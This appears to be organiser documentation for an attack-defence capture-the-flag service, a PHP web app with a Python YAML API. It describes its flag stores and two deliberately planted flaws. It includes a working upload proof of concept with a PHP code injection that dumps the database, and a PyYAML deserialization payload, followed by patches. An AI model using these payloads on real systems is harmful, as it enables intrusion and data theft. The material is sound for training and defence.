# Service documentation

# Service Components
This service is built using PHP. The frontend is raw HTML/JS/CSS. The service also uses a MYSQL database and has an api backend service written in python. Only the PHP service is accessable from outside the container.

# Functionalities and Flag stores
A use will be able to:
* register an account.
* login to that account
* update their profile:
  * post public comments
  * post private comments (***FLAG STORE 1*** in the database)
  * upload profile pictures (***VULN 1***)
* view other profiles
* match with other people
  * this is handeled in the python api (***FLAG STORE 2*** in the filesystem as a filename)
  * they can customize their request (***VULN 2***)
  * they can see the results in a differnet request
 
# Vulnerabilities and Exploits
1. *Unrestricted File Upload (UFU)*: The file upload functionality in the profile.php/upload.php is insufficient. A user can upload a ***.php*** file using a *fake* image. To do so, the attacker needs to have a valid image and then inject PHP code into the metadata of the image and save it as *<filename>.php*. The attacker then needs to upload the malicious file directly via the upload.php.\
POC:
```
import requests

session = requests.Session()
login_url = 'http://localhost:8080/login.php'

login_data = {
    'username': 'username',
    'password': 'password'
}
# we assume that this user exists already
response = session.post(login_url, data=login_data)

files = {"image": open("exploit.php", "rb")}
response = session.post('http://localhost:8080/upload.php', files=files)
print(response.text) # check if we successfully uploaded our exploit
```
To get the flags the following PHP code could be injected:
```
<?php require '../../config.php'; $r=$conn->query('SELECT * FROM comments'); echo print_r($r->fetch_all()); ?>
```
***NOTE***: the MYSQL user is in append only mode, meaning that the flags can't be deleted. However, the docker-compose.yml file defines a default root password for the database. THIS MUST BE CHANGED by the team orelse the attacker can login to the database as root and delete the flags.

2. *Usage of unsafe library function call*: The api backend expects a yaml file, which will then be handled using PYYAML. However, the api uses the unsafe function yaml.load (with the default loader: yaml.Loader). This makes it possible to execute python commands using a specific syntax. This vulnerability is somehow contained, as the api forks and chroots each time a request is made (revents the use of system commands).
POC:
The attack.json file will provide the username of the account that hold the flag. To get the flag we can then inject the following command in the punchline:
```
!!python/object/apply:os.listdir ["uploads/{hashed_username}"]
```
This will list all the files of the user directory, including the hex encoded flag.

# Fixes
1. To fix the first vulnerability we can disallow ***.php*** extensions. Another approach would be to only allow a whitelist including only PNG and JPEG:
```
$destination = $upload_dir . $_FILES["image"]["name"];
// BEGIN OF PATCH
$file_name = basename($_FILES["image"]["name"]);
$file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
$allowed_exts = ["jpg", "jpeg", "png"];

if (!in_array($file_ext, $allowed_exts)) {
    echo "Error: Invalid file extension.";
    exit();
}
// END OF PATCH
$mime_check = getimagesize($_FILES["image"]["tmp_name"])["mime"];
```
2. To fix the second vulnerability we can use the safe function to load yaml files:
```
# old
parsed_data = yaml.load(yaml_data, yaml.Loader)
yaml.dump(user_info, open(file_path, "w"))

# new
parsed_data = yaml.safe_load(yaml_data)
yaml.safe_dump(user_info, open(file_path, "w"))
```
